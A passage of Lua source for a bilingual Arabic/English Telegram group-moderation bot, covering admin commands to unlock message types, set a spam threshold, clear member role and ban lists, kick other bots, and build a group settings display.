Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock webpage ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـشبكٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:webpage:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ webpag is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـشبكٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "arabic" or unmutepts[2] == "العربيه" then
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock arabic ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـعربية فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:arabic:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ arabic is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـعربية بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "english" or unmutepts[2] == "الانكليزيه" then
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock english ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱلٱنكڵيزيه فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 62, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:english:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ english is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱنكڵيزيه بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "tgservice" or unmutepts[2] == "الاشعارات" then
if DevAbs:get(loolIQ..'bot:tgservice:jk'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock tgservice ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱلٱشعٱرٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 61, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:tgservice:jk'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ tgservice is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱشعٱرٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "sticker" or unmutepts[2] == "الملصقات" then
if DevAbs:get(loolIQ..'bot:sticker:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock sticker ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵمڵصقٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 60, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:sticker:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ sticker is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمڵصقٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unmutept[2] == "fwd" or unmutepts[2] == "التوجيه" then
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock fwd ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـتوجيه فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:forward:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ fwd is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـتوجيه بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etspam (%d+)$") then
local sensspam = {string.match(text, "^([Ss]etspam) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Enter a number greater than 40 ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱختر عدد ٱكبر من ( 40 ) حـرف ', 1, 'md')
end
else
DevAbs:set(loolIQ..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم وضع عدد ٱلٱحـرف : ( '..sensspam[2]..' )\n❗️🔑 ⌯ ٱذٱ كٱنت ٱڵرسٱڵة تحتوي عڵى ( '..sensspam[2]..' ) حرف سيتم حذفهٱ تڵقٱئيٱ بوٱسطة ٱڵـبوت ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n❗️🔑 ⌯ Sentences have over '..sensspam[2]..' character will delete ', 1, 'md')
end
end
end
if text:match("^ضع عدد الاحرف (%d+)$") then
local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
if tonumber(sensspam[2]) < 40 then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Enter a number greater than 40 ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗❗️🚸 ⌯ ٱختر عدد ٱكبر من ( 40 ) حـرف ', 1, 'md')
end
else
DevAbs:set(loolIQ..'bot:sens:spam'..msg.chat_id_,sensspam[2])
if not DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم وضع عدد ٱلٱحـرف : ( '..sensspam[2]..' )\n❗️🔑 ⌯ ٱذٱ كٱنت ٱڵرسٱڵة تحتوي عڵى ٱكثر من ( '..sensspam[2]..' ) حرف سيتم حذفهٱ تڵقٱئيٱ بوٱسطة ٱڵـبوت ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Spam sensitivity has been set to [ ' ..sensspam[2]..' ]\n❗️🔑 ⌯ Sentences have over '..sensspam[2]..' character will delete ', 1, 'md')
end
end
end
end     
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^حذف (.*)$") then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(حذف) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
if txt[2] == 'banlist' or txts[2] == 'المحظورين' then
DevAbs:del(loolIQ..'bot:banned:'..msg.chat_id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Banlist has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمحظورين \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 34, string.len(msg.sender_user_id_))
end
end
if is_sudo(msg) then 
if txt[2] == 'banalllist' or txts[2] == 'قائمه العام' then
DevAbs:del(loolIQ..'bot:gban:')
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Banalllist has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف قٱئمة ٱڵعٱم \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 34, string.len(msg.sender_user_id_))
end
end
end
if is_leader(msg) then 
if txt[2] == 'dev3' or txts[2] == 'المطورين' then
DevAbs:del(loolIQ..'abs:sudo3:')
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Banalllist has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف مطورين ٱڵبوت \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 46, string.len(msg.sender_user_id_))
end
end
end
if txts[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end 
end
end
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵبوتٱت \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 32, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if txt[2] == 'monsh2' or txts[2] == 'المنشئين' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ monsh list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمنشئين \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 33, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:monshid:'..msg.chat_id_)
end end
if txt[2] == 'modlist' or txts[2] == 'الادمنيه' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Mod list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱلٱدمنية \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 33, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:admins'..msg.chat_id_)
end
if txt[2] == 'donky list' or txts[2] == 'المطايه' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Mod list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمطٱية \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 32, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:donky:'..msg.chat_id_)
end
if txt[2] == 'voplist' or txts[2] == 'المميزين' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ VIP Members list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱلٱعضٱء ٱڵمميزين \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 41, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:vipmem'..msg.chat_id_)
end
if txt[2] == 'filterlist' or txts[2] == 'قائمه المنع' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Filterlist has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف قٱئمة ٱڵمنع \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 36, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:filters:'..msg.chat_id_)
end
if txt[2] == 'mutelist' or txts[2] == 'المكتومين' then
DevAbs:del(loolIQ..'bot:muted:'..msg.chat_id_)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Muted users list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمكتومين \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 34, string.len(msg.sender_user_id_))
end
end
end
end
if text == 'حذف الرابط' then
DevAbs:del(loolIQ.."bot:group:link"..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم حـذف رٱبط ٱڵمجموعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟ ', 1, 'md')
end
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^حذف (.*)$") then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(حذف) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
if txts[2] == 'freelist' or txts[2] == 'قائمه المنع العام' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Freelist has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف قٱئمة ٱڵمنع ٱڵعٱم \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 42, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:freewords:')
end
if txt[2] == 'owners' or txts[2] == 'المدراء' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ owner list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمدرٱء \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 32, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:owners:'..msg.chat_id_)
end
if txt[2] == 'monsh' or txts[2] == 'المنشئين الاساسيين' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ monsh list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمنشئين ٱلٱسٱسيين \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 33, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:monsh:'..msg.chat_id_)
end
if txt[2] == 'momod all' or txts[2] == 'الادمنيه العامين' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Mod all list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱلٱدمنية ٱڵعٱمين \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 41, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:adminall:')
end
if txt[2] == 'vip all' or txts[2] == 'المميزين عام' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ vip all list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمميزين عٱم \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 37, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:vipall:')
end
if txt[2] == 'ownerall' or txts[2] == 'المدراء العامين' then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Mod list has been cleared ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم حـذف ٱڵمدرٱء ٱڵعٱمين \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 40, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'abs:ownerall:')
end
end
end
if text:match("^حذف القوائم$") then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمشرفين فقط ', 1, 'md')
else
DevAbs:del(loolIQ..'bot:banned:'..msg.chat_id_)
DevAbs:del(loolIQ..'abs:admins'..msg.chat_id_)
DevAbs:del(loolIQ..'bot:donky:'..msg.chat_id_)
DevAbs:del(loolIQ..'abs:vipmem'..msg.chat_id_)
DevAbs:del(loolIQ..'bot:filters:'..msg.chat_id_)
DevAbs:del(loolIQ..'bot:muted:'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️⚠️ ⌯ تـۖم حذف ٱڵمحظورين \n❗️🔕 ⌯ تـۖم حذف ٱڵمكتومين \n❗️🔱 ⌯ تـۖم حذف ٱلٱدمنية \n❗️💎 ⌯ تـۖم حذف ٱڵمميزين \n❗️🦠 ⌯ تـۖم حذف ٱڵمطٱية  \n❗️🎒 ⌯ تـۖم حذف قٱ ئمة ٱڵمنع \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ( '..abs_rank(msg)..' ) ', 1, 'md')
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]ettings$") or text:match("^الاعدادات$") then
if DevAbs:get(loolIQ..'bot:muteall'..msg.chat_id_) then
mute_all = 'مقفڵه'
else
mute_all = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:text:mute'..msg.chat_id_) then
mute_text = 'مقفڵه'
else
mute_text = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:photo:mute'..msg.chat_id_) then
mute_photo = 'مقفڵه'
else
mute_photo = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:video:mute'..msg.chat_id_) then
mute_video = 'مقفڵه'
else
mute_video = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:gifs:mute'..msg.chat_id_) then
mute_gifs = 'مقفڵه'
else
mute_gifs = 'مفتوحه'
end
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
mute_flood = 'مقفڵه'
else
mute_flood = 'مفتوحه'
end
--     Source loolIQ     --
if not DevAbs:get(loolIQ..'flood:max:'..msg.chat_id_) then
flood_m = 5
else
flood_m = DevAbs:get(loolIQ..'flood:max:'..msg.chat_id_)
end
--     Source loolIQ     --
if not DevAbs:get(loolIQ..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250
else
spam_c = DevAbs:get(loolIQ..'bot:sens:spam'..msg.chat_id_)
end
--     Source loolIQ     --
if DevAbs:get(loolIQ..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بٱڵحذف"
elseif DevAbs:get(loolIQ..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بٱڵطرد"
elseif not DevAbs:get(loolIQ..'floodstatus'..msg.chat_id_) then
floodstatus = "بٱڵحذف"
end
--     Source loolIQ     --
if DevAbs:get(loolIQ..'bot:music:mute'..msg.chat_id_) then
mute_music = 'مقفڵه'
else
mute_music = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:bots:ban'..msg.chat_id_) then
mute_bots = 'مقفڵه'
else
mute_bots = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:inline:mute'..msg.chat_id_) then
mute_in = 'مقفڵه'
else
mute_in = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:cmds'..msg.chat_id_) then
mute_cmd = 'مقفڵه'
else
mute_cmd = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:voice:mute'..msg.chat_id_) then
mute_voice = 'مقفڵه'
else
mute_voice = 'مفتوحه'
end
if DevAbs:get(loolIQ..'editmsg'..msg.chat_id_) then
mute_edit = 'مقفڵه'
else
mute_edit = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مقفڵه'
else
mute_links = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:pin:mute'..msg.chat_id_) then
lock_pin = 'مقفڵه'
else
lock_pin = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:sticker:mute'..msg.chat_id_) then
lock_sticker = 'مقفڵه'
else
lock_sticker = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:tgservice:jk'..msg.chat_id_) then
lock_tgservice = 'مقفڵه'
else
lock_tgservice = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
lock_wp = 'مقفڵه'
else
lock_wp = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:strict'..msg.chat_id_) then
strict = 'مقفڵه'
else
strict = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
lock_htag = 'مقفڵه'
else
lock_htag = 'مفتوحه'
end
if DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
lock_tag = 'مقفڵه'
else
lock_tag = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:location:mute'..msg.chat_id_) then
lock_location = 'مقفڵه'
else
lock_location = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:contact:mute'..msg.chat_id_) then
lock_contact = 'مقفڵه'
else
lock_contact = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
lock_english = 'مقفڵه'
else
lock_english = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
lock_arabic = 'مقفڵه'
else
lock_arabic = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:forward:mute'..msg.chat_id_) then
lock_forward = 'مقفڵه'
else
lock_forward = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:document:mute'..msg.chat_id_) then
lock_file = 'مقفڵه'
else
lock_file = 'مفتوحه'
end
if DevAbs:get(loolIQ..'markdown:lock'..msg.chat_id_) then
markdown = 'مقفڵه'
else
markdown = 'مفتوحه'
end
if DevAbs:get(loolIQ..'bot:spam:mute'..msg.chat_id_) then
lock_spam = 'مقفڵه'
else
lock_spam = 'مفتوحه'
end
if DevAbs:get(loolIQ.."bot:welcome"..msg.chat_id_) then
send_welcome = 'مقفڵه'
else
send_welcome = 'مفتوحه'
end
--     Source loolIQ     --
local TXTAR = "❗️🎒 ⌯ اعدادات المجموعة :\n〰️➖〰️➖〰️➖〰️➖〰️\n"
.."❗️🧩 ⌯ ٱڵروٱبط ⌯» "..mute_links.."\n"
.."❗️♟ ⌯ ٱڵمعرف ⌯» "..lock_tag.."\n"
